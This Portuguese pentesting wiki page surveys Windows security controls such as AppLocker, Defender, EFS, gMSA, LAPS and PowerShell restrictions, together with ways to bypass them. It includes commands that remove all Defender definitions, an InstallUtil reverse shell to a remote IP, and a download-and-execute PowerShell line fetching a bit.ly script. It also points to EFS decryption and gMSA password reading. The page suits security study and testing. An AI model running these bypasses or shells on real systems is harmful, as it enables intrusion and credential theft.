# Controles de Segurança do Windows

{{#include ../banners/hacktricks-training.md}}

## Política do AppLocker

Uma whitelist de aplicações é uma lista de aplicações de software ou executáveis aprovados que podem estar presentes e ser executados em um sistema. O objetivo é proteger o ambiente contra malware prejudicial e software não aprovado que não esteja alinhado às necessidades específicas de negócio de uma organização.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) é a **solução de whitelist de aplicações** da Microsoft e permite que administradores de sistemas controlem **quais aplicações e arquivos os usuários podem executar**. Ela fornece **controle granular** sobre executáveis, scripts, arquivos do Windows Installer, DLLs, aplicações empacotadas e instaladores de aplicações empacotados.\
É comum que organizações **bloqueiem cmd.exe e PowerShell.exe** e o acesso de gravação a determinados diretórios, **mas tudo isso pode ser bypassed**.

### Verificar

Verifique quais arquivos/extensões estão na blacklist/whitelist:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Este caminho do registro contém as configurações e políticas aplicadas pelo AppLocker, fornecendo uma maneira de revisar o conjunto atual de regras aplicadas no sistema:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- **Pastas graváveis** úteis para realizar o **bypass** da política do AppLocker: se o AppLocker permitir a execução de qualquer coisa dentro de `C:\Windows\System32` ou `C:\Windows`, existem **pastas graváveis** que você pode usar para **contornar isso**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Binários [**"LOLBAS's"**](https://lolbas-project.github.io/) **confiáveis** também podem ser úteis para contornar o AppLocker.
- **Regras mal elaboradas também poderiam ser contornadas**
- Por exemplo, com **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, você pode criar uma **pasta chamada `allowed`** em qualquer lugar, e ela será permitida.
- As organizações também costumam se concentrar em **bloquear o executável `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, mas esquecem os **outros** [**locais dos executáveis do PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), como `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ou `PowerShell_ISE.exe`.
- A **aplicação de regras para DLLs raramente é habilitada**, devido à carga adicional que pode impor ao sistema e à quantidade de testes necessária para garantir que nada será prejudicado. Portanto, usar **DLLs como backdoors ajudará a contornar o AppLocker**.
- Você pode usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **executar código Powershell** em qualquer processo e contornar o AppLocker. Para mais informações, consulte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Armazenamento de credenciais

### Security Accounts Manager (SAM)

As credenciais locais estão presentes neste arquivo; as senhas são armazenadas em hash.

### Local Security Authority (LSA) - LSASS

As **credenciais** (em hash) são **armazenadas na memória** desse subsistema por motivos de Single Sign-On.\
A **LSA** administra a **política de segurança** local (política de senhas, permissões de usuários...), **autenticação**, **tokens de acesso**...\
A LSA será responsável por **verificar** as credenciais fornecidas no arquivo **SAM** (para um login local) e **comunicar-se** com o **controlador de domínio** para autenticar um usuário do domínio.

As **credenciais** são **armazenadas dentro do processo LSASS**: tickets Kerberos, hashes NT e LM e senhas facilmente descriptografadas.

### Segredos da LSA

A LSA pode salvar algumas credenciais no disco:

- Senha da conta do computador do Active Directory (controlador de domínio inacessível).
- Senhas das contas dos serviços do Windows
- Senhas de tarefas agendadas
- Mais informações (senha de aplicações IIS...)

### NTDS.dit

É o banco de dados do Active Directory. Ele está presente apenas nos Controladores de Domínio.

## Defender

O [**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) é um antivírus disponível no Windows 10 e no Windows 11, bem como em versões do Windows Server. Ele **bloqueia** ferramentas comuns de pentesting, como **`WinPEAS`**. No entanto, existem formas de **contornar essas proteções**.

### Verificação

Para verificar o **status** do **Defender**, você pode executar o cmdlet PS **`Get-MpComputerStatus`** (verifique o valor de **`RealTimeProtectionEnabled`** para saber se ele está ativo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Para enumerá-lo, você também pode executar:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Sistema de Arquivos Criptografados (EFS)

O EFS protege arquivos por meio de criptografia, utilizando uma **chave simétrica** conhecida como **File Encryption Key (FEK)**. Essa chave é criptografada com a **chave pública** do usuário e armazenada no **fluxo de dados alternativo** $EFS do arquivo criptografado. Quando a descriptografia é necessária, a **chave privada** correspondente ao certificado digital do usuário é usada para descriptografar a FEK do fluxo $EFS. Mais detalhes podem ser encontrados [aqui](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Cenários de descriptografia sem iniciação do usuário** incluem:

- Quando arquivos ou pastas são movidos para um sistema de arquivos que não seja EFS, como [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), eles são descriptografados automaticamente.
- Arquivos criptografados enviados pela rede usando o protocolo SMB/CIFS são descriptografados antes da transmissão.

Esse método de criptografia permite **acesso transparente** aos arquivos criptografados pelo proprietário. No entanto, simplesmente alterar a senha do proprietário e fazer login não permitirá a descriptografia.

**Principais conclusões**:

- O EFS usa uma FEK simétrica, criptografada com a chave pública do usuário.
- A descriptografia utiliza a chave privada do usuário para acessar a FEK.
- A descriptografia automática ocorre sob condições específicas, como copiar para FAT32 ou realizar uma transmissão pela rede.
- Os arquivos criptografados ficam acessíveis ao proprietário sem etapas adicionais.

### Verificar informações do EFS

Verifique se um **usuário** **usou** esse **serviço**, verificando se este caminho existe:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Verifique **quem** tem **acesso** ao arquivo usando cipher /c \<file>\
Você também pode usar `cipher /e` e `cipher /d` dentro de uma pasta para **criptografar** e **descriptografar** todos os arquivos

### Descriptografando arquivos EFS

#### Sendo Authority System

Essa abordagem exige que o **usuário vítima** esteja **executando** um **processo** no host. Nesse caso, em uma sessão do `meterpreter`, você pode personificar o token do processo do usuário (`impersonate_token` do `incognito`). Como alternativa, você pode fazer `migrate` para o processo do usuário.

#### Conhecendo a senha do usuário

O Mimikatz pode importar o certificado e a chave privada do usuário e, então, usá-los para descriptografar arquivos protegidos pelo EFS.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Contas de Serviço Gerenciadas por Grupo (gMSA)

A Microsoft desenvolveu as **Contas de Serviço Gerenciadas por Grupo (gMSA)** para simplificar o gerenciamento de contas de serviço em infraestruturas de TI. Diferentemente das contas de serviço tradicionais, que geralmente têm a configuração "**Password never expire**" habilitada, as gMSAs oferecem uma solução mais segura e gerenciável:

- **Gerenciamento automático de senhas**: as gMSAs usam uma senha complexa de 240 caracteres que muda automaticamente de acordo com a política do domínio ou do computador. Esse processo é gerenciado pelo Key Distribution Service (KDC) da Microsoft, eliminando a necessidade de atualizações manuais de senha.
- **Segurança aprimorada**: essas contas são imunes a bloqueios e não podem ser usadas para logins interativos, aumentando sua segurança.
- **Suporte a múltiplos hosts**: as gMSAs podem ser compartilhadas entre vários hosts, sendo ideais para serviços executados em vários servidores.
- **Compatibilidade com tarefas agendadas**: diferentemente das contas de serviço gerenciadas, as gMSAs permitem a execução de tarefas agendadas.
- **Gerenciamento simplificado de SPN**: o sistema atualiza automaticamente o Service Principal Name (SPN) quando há alterações nos detalhes de sAMaccount ou no nome DNS do computador, simplificando o gerenciamento de SPN.

As senhas das gMSAs são armazenadas na propriedade LDAP _**msDS-ManagedPassword**_ e redefinidas automaticamente a cada 30 dias pelos Domain Controllers (DCs). Essa senha, um blob de dados criptografado conhecido como [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), só pode ser recuperada por administradores autorizados e pelos servidores nos quais as gMSAs estão instaladas, garantindo um ambiente seguro. Para acessar essas informações, é necessária uma conexão protegida, como LDAPS, ou a conexão deve ser autenticada com 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Você pode ler essa senha com [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Encontre mais informações nesta publicação**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Além disso, consulte esta [página web](https://cube0x0.github.io/Relaying-for-gMSA/) sobre como realizar um **NTLM relay attack** para **ler** a **senha** de **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

O **Local Administrator Password Solution (LAPS)**, disponível para download na [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), permite o gerenciamento das senhas do Administrator local. Essas senhas, que são **randomizadas**, exclusivas e **alteradas regularmente**, são armazenadas centralmente no Active Directory. O acesso a essas senhas é restrito por meio de ACLs a usuários autorizados. Com permissões suficientes concedidas, é possível ler as senhas do administrador local.

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

O [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) do PowerShell **bloqueia muitos dos recursos** necessários para usar o PowerShell de forma eficaz, como o bloqueio de objetos COM, a permissão apenas de tipos .NET aprovados, workflows baseados em XAML, classes do PowerShell e muito mais.

### **Verifique**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Em versões atuais do Windows, esse Bypass não funcionará, mas você pode usar o [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Para compilá-lo, talvez seja necessário** **adicionar uma referência** -> _Browse_ ->_Browse_ -> adicionar `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` e **alterar o projeto para .Net4.5**.

#### Bypass direto:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Você pode usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ou [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **executar** código do Powershell em qualquer processo e contornar o modo restrito. Para obter mais informações, consulte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Política de Execução do PS

Por padrão, ela é definida como **restrita.** Principais formas de contornar essa política:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Mais informações podem ser encontradas [aqui](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

É a API que pode ser usada para autenticar usuários.

O SSPI ficará encarregado de encontrar o protocolo adequado para duas máquinas que desejam se comunicar. O método preferido para isso é o Kerberos. Em seguida, o SSPI negociará qual protocolo de autenticação será usado. Esses protocolos de autenticação são chamados de Security Support Provider (SSP), estão localizados em cada máquina Windows na forma de uma DLL, e ambas as máquinas devem oferecer suporte ao mesmo protocolo para poderem se comunicar.

### Principais SSPs

- **Kerberos**: O preferido
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** e **NTLMv2**: Por motivos de compatibilidade
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Servidores Web e LDAP, senha na forma de um hash MD5
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL e TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: É usado para negociar o protocolo a ser utilizado (Kerberos ou NTLM, sendo Kerberos o padrão)
- %windir%\Windows\System32\lsasrv.dll

#### A negociação pode oferecer vários métodos ou apenas um.

## UAC - User Account Control

O [User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) é um recurso que permite um **prompt de consentimento para atividades elevadas**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## References

- [1] [Contornando o AppLocker e o modo de linguagem restrita do PowerShell](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [como descriptografar arquivos EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying para gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 maneiras de contornar a política de execução do PowerShell](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
{{#include ../banners/hacktricks-training.md}}
